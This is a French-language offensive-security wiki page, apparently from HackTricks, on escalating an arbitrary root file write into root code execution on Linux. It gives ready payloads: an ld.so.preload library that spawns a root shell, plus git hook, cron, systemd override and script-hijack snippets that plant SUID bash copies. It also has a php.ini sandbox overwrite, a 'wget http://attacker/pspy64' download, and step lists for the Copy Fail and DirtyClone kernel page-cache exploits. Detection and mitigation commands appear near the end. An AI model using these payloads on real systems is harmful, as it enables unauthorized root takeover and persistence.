# Écriture arbitraire de fichier en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` est une liste à l'échelle du système d'objets partagés que le linker dynamique charge avant les autres objets partagés. Le mode d'exécution sécurisée applique des restrictions supplémentaires au preloading, de sorte qu'un chemin de bibliothèque tel que `/tmp/pe.so` ne constitue pas une technique universelle pour les binaires SUID.\
Si vous pouvez le créer ou le modifier, un processus qui charge ce fichier chargera la bibliothèque indiquée avant ses autres objets partagés, ce qui permet l'exécution de code dans le contexte de ce processus.<sup>[[12]](#references)</sup>

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

Les **Git hooks** sont des scripts exécutables lancés lors d’événements dans un dépôt, notamment lors des opérations de commit et de merge. Si un **script ou un utilisateur privilégié** effectue ces actions et qu’un attaquant peut **écrire dans le dossier `.git`**, le hook peut être utilisé pour une **élévation de privilèges**.<sup>[[13]](#references)</sup>

Par exemple, il est possible de **générer un script** dans un dépôt git, dans **`.git/hooks`**, afin qu’il soit toujours exécuté lorsqu’un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Fichiers Cron et fichiers temporels

Si vous pouvez **écrire dans des fichiers liés à Cron exécutés par root**, vous pouvez généralement obtenir une code execution lors de la prochaine exécution du job. Les cibles intéressantes incluent :<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- La crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu’ils déclenchent

Vérifications rapides :
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Chemins d’abus typiques :

- **Ajouter un nouveau cron job root** à `/etc/crontab` ou dans un fichier de `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Backdoorer une cible de timer existante** en modifiant le script ou le binaire qu’elle lance

Exemple minimal de payload cron :
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si vous pouvez uniquement écrire dans un répertoire cron utilisé par `run-parts`, déposez-y plutôt un fichier exécutable :
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes :

- `run-parts` ignore généralement les noms de fichiers contenant des points ; préférez donc des noms comme `backup` plutôt que `backup.sh`.<sup>[[15]](#references)</sup>
- Certains systèmes utilisent des timers `systemd` au lieu du cron classique, mais l’idée d’abus reste la même : **modifier ce que root exécutera ultérieurement**.<sup>[[20]](#references)</sup>

### Fichiers de service et de socket

Si vous pouvez écrire des fichiers d’unité **`systemd`** ou des fichiers auxquels ils font référence, vous pouvez éventuellement obtenir une exécution de code en tant que root en rechargeant et en redémarrant l’unité, ou en attendant que le chemin d’activation du service/socket se déclenche.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Les cibles intéressantes incluent :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides drop-in dans `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binaires de service référencés par `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Chemins `EnvironmentFile=` inscriptibles chargés par un service root

Vérifications rapides :
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Chemins d’abus courants :

- **Overwrite `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Add a drop-in override** avec un `ExecStart=` malveillant et effacer l’ancien au préalable
- **Backdoor** le script/binaire déjà référencé par l’unité
- **Hijack a socket-activated service** en modifiant le fichier `.service` correspondant, qui démarre lorsque la socket reçoit une connexion

Exemple d’override malveillant :
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flux d'activation typique :
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si vous ne pouvez pas redémarrer vous-même les services, mais que vous pouvez modifier une unité activée par socket, il peut vous suffire **d'attendre une connexion cliente** pour déclencher l'exécution du service backdoored en tant que root.<sup>[[17]](#references)</sup>

### Écraser un `php.ini` restrictif utilisé par un sandbox PHP privilégié

Certains daemons personnalisés valident le PHP fourni par l'utilisateur en exécutant `php` avec un **`php.ini` restrictif** (par exemple, `disable_functions=exec,system,...`). Si le code exécuté dans le sandbox dispose toujours d'une **primitive d'écriture** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **écraser cette configuration** pour lever les restrictions, puis soumettre un second payload qui s'exécute avec des privilèges élevés.<sup>[[2]](#references)</sup>

Flux typique :

1. Le premier payload écrase la configuration du sandbox.
2. Le second payload exécute du code maintenant que les fonctions dangereuses sont à nouveau activées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si le daemon s’exécute en tant que root (ou effectue des validations avec des chemins appartenant à root), la deuxième exécution fournit un contexte root. Il s’agit essentiellement d’une **élévation de privilèges via l’écrasement de la configuration** lorsque le runtime sandboxé peut toujours écrire des fichiers.

### binfmt_misc

`binfmt_misc` expose des enregistrements sous `/proc/sys/fs/binfmt_misc` ; chaque enregistrement associe un motif de type de fichier à un interpréteur. L’impact sur les privilèges dépend de l’utilisateur autorisé à modifier l’enregistrement et du processus qui exécute ensuite le fichier correspondant. Vérifiez donc ces conditions avant de considérer cela comme une voie d’élévation de privilèges.<sup>[[21]](#references)</sup>

### Écraser les handlers de schéma (comme http: ou https:)

Les environnements de bureau utilisent des associations MIME et des entrées desktop pour choisir une application pour les schémas URI ; un attaquant capable d’écrire dans la configuration pertinente de l’utilisateur et dans les répertoires d’entrées desktop peut rediriger ces schémas vers un launcher qu’il contrôle. En modifiant le fichier `$HOME/.config/mimeapps.list` afin d’associer les handlers d’URL HTTP et HTTPS à un fichier malveillant (par exemple, `x-scheme-handler/http=evil.desktop` et `x-scheme-handler/https=evil.desktop`), un clic de l’utilisateur peut invoquer cette entrée desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Scripts/binaires exécutés par root et contrôlés par l’utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou tout binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :<sup>[[1]](#references)</sup>

- **Détecter l’exécution :** surveillez les processus avec pspy pour détecter root invoquant des chemins contrôlés par l’utilisateur.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** assurez-vous que le fichier cible et son répertoire sont détenus par votre utilisateur et accessibles en écriture.
- **Hijack the target:** sauvegardez le binaire/script original et déposez un payload qui crée un shell SUID (ou toute autre action root), puis restaurez les permissions :
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclenchez l’action privilégiée** (par exemple, en appuyant sur un bouton de l’interface qui lance le helper). Lorsque root réexécute le chemin détourné, récupérez le shell avec élévation de privilèges à l’aide de `./rootshell -p`.

### Modification de fichiers binaires privilégiés limitée au page cache

Certains bugs du kernel ne modifient pas le fichier **sur le disque**. Ils permettent plutôt de modifier uniquement la **copie du page cache d’un fichier lisible**. Si vous pouvez cibler un binaire **setuid** ou autrement **exécuté par root**, l’exécution suivante peut lancer des octets contrôlés par l’attaquant depuis la mémoire et permettre une élévation de privilèges, même si le hash du fichier sur le disque reste inchangé.<sup>[[3]](#references)[[4]](#references)</sup>

Il est utile de considérer cela comme une **primitive d’écriture de fichier uniquement à l’exécution** :<sup>[[3]](#references)</sup>

- **Le disque reste propre** : l’inode et les octets présents sur le disque ne changent pas
- **La mémoire est modifiée** : les processus qui lisent ou exécutent la page mise en cache obtiennent le contenu modifié par l’attaquant
- **L’effet est temporaire** : la modification disparaît après un redémarrage ou une éviction du cache

Cette primitive se situe entre l’**arbitrary file write** classique et les anciens bugs d’abus du **page cache**, tels que Dirty COW / Dirty Pipe :<sup>[[3]](#references)</sup>

- Dirty COW reposait sur une race condition
- Dirty Pipe était soumis à des contraintes de position d’écriture
- Une primitive limitée au page cache peut être plus fiable si le chemin vulnérable permet des écritures directes dans des pages mappées sur des fichiers et présentes dans le cache

#### Flux générique de privesc

1. Obtenir une primitive kernel permettant d’écrire dans des pages du page cache mappées sur des fichiers
2. L’utiliser contre un **binaire privilégié lisible** ou un autre fichier exécuté par root
3. Déclencher l’exécution **avant** l’éviction de la page du cache
4. Obtenir une exécution de code en tant que root tandis que le fichier sur le disque semble toujours inchangé

Cibles typiques à forte valeur :

- Les binaires **setuid-root**
- Les helpers lancés par des **services root**
- Les binaires fréquemment exécutés depuis des **containers partageant le kernel/page cache de l’hôte**

#### Exemple de chemin AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) est un bon exemple de cette catégorie. Le chemin vulnérable se trouvait dans l’API userspace de cryptographie Linux (`AF_ALG` / `algif_aead`) :<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` peut déplacer des références vers des pages du page cache depuis un fichier lisible vers la scatterlist TX de la cryptographie
- le chemin de déchiffrement `algif_aead` in-place réutilisait les buffers source et destination
- `authencesn` écrivait ensuite dans la région du tag de destination
- lorsque cette région référençait encore des pages mappées sur le fichier et présentes dans le cache, l’écriture atterrissait dans le **page cache du fichier cible**

La technique intéressante n’est donc pas le CVE lui-même, mais le schéma suivant :

- **injecter des pages du cache mappées sur un fichier dans un sous-système du kernel**
- faire en sorte que le sous-système les **traite comme une sortie inscriptible**
- déclencher une petite écriture contrôlée en mémoire

Le PoC public utilisait des **écritures répétées de 4 octets** pour modifier `/usr/bin/su` en mémoire, puis l’exécutait.<sup>[[4]](#references)[[7]](#references)</sup>

#### Exemple de chemin ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) présente une autre variante du même schéma **page-cache-only write-to-root**, mais cette fois le sink est le **déchiffrement IPsec ESP** au lieu de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La technique importante est l’étape de **metadata-laundering** :

- `splice()` place une **page du page cache en lecture seule, mappée sur un fichier**, dans un paquet ESP-in-UDP
- l’atténuation DirtyFrag originale marquait ce skb avec `SKBFL_SHARED_FRAG` afin que `esp_input()` effectue une **copie avant le déchiffrement**
- netfilter `TEE` duplique le paquet via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- le clone conserve la **même référence physique vers la page du page cache**, mais perd `SKBFL_SHARED_FRAG`
- `esp_input()` considère alors le clone comme sûr et exécute le déchiffrement **in-place** `cbc(aes)` sur la page mappée sur le fichier

La leçon pour la revue est plus large que le CVE : si une atténuation dépend des **métadonnées du skb/de la page** pour déterminer si une opération doit d’abord effectuer une copie, tout **chemin de clonage/copie qui conserve la page sous-jacente mais supprime les métadonnées** peut silencieusement réactiver la primitive d’écriture.

Flux d’exploitation typique :

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` pour obtenir **`CAP_NET_ADMIN` dans un network namespace privé**
2. activer la loopback et installer une règle **netfilter `TEE`** dans `mangle/OUTPUT`
3. installer des SA de transport XFRM ESP via `NETLINK_XFRM`
4. encoder chaque mot cible de 4 octets dans le champ `seq_hi` de la SA (technique de sélection de mot de DirtyFrag)
5. envoyer le paquet ESP-in-UDP obtenu avec `splice()` afin que le **clone TEE** atteigne `esp_input()` et effectue le déchiffrement **in-place**
6. répéter jusqu’à ce que la copie du page cache de `/usr/bin/su` ou d’un autre exécutable privilégié contienne du code contrôlé par l’attaquant

En pratique, l’impact est le même que dans l’exemple `AF_ALG` : le fichier sur le disque reste propre, mais `execve()` utilise les **octets modifiés du page cache** et fournit un shell root.<sup>[[8]](#references)[[9]](#references)</sup>

Vérifications d’exposition utiles pour cette variante :
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La réduction à court terme de la surface d'attaque est également spécifique au chemin ici : la mise à niveau vers un kernel contenant `48f6a5356a33` corrige le chemin `clone`, tandis que le blocage de l'autoload de `xt_TEE` supprime l'**étape de flag laundering** et que le blocage de `esp4` / `esp6` supprime le **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposition et hunting

Si vous suspectez cette classe de bug, ne vous fiez pas uniquement aux contrôles d'intégrité du disque. Vérifiez également :
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Les valeurs de configuration ci-dessous distinguent une interface chargeable d’une interface intégrée au kernel ; les règles de compilation crypto associent `CONFIG_CRYPTO_USER_API_AEAD` à `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m` : `algif_aead` peut être chargé ou déchargé comme module
- `CONFIG_CRYPTO_USER_API_AEAD=y` : l’interface est intégrée au kernel
- les binaires setuid sont de bonnes cibles, car un patch limité au page cache peut suffire à transformer un foothold local en root

#### Réduction de la surface d’attaque pour le chemin `algif_aead`

Si l’interface vulnérable est fournie par un module chargeable :<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
S’il est compilé dans le kernel, certaines divulgations ont signalé le blocage du chemin init avec :<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ce type de mitigation mérite également d’être retenu pour d’autres kernel LPEs : si l’exploitation dépend d’une interface optionnelle spécifique, désactiver ou blacklister cette interface peut interrompre le chemin d’exploitation avant même qu’une mise à niveau complète du kernel ne soit disponible.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – détournement d’un script exécuté par root dans un répertoire PaperCut accessible en écriture par un utilisateur](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ sur Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgation Openwall oss-security concernant CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correctif Linux stable : crypto: algif_aead - retour au fonctionnement out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint : analyse technique](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Dépôt / README de DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog : analyse et exploitation de la variante Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correctif Linux : net: skb: préservation de `SKBFL_SHARED_FRAG` dans `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigation Linux antérieure : définir `SKBFL_SHARED_FRAG` pour les paquets UDP assemblés (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — page de manuel Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentation du Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associations des applications MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spécification Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Spécification Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Langage Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto de Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001 : vulnérabilité du cache de pages AF_ALG du Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
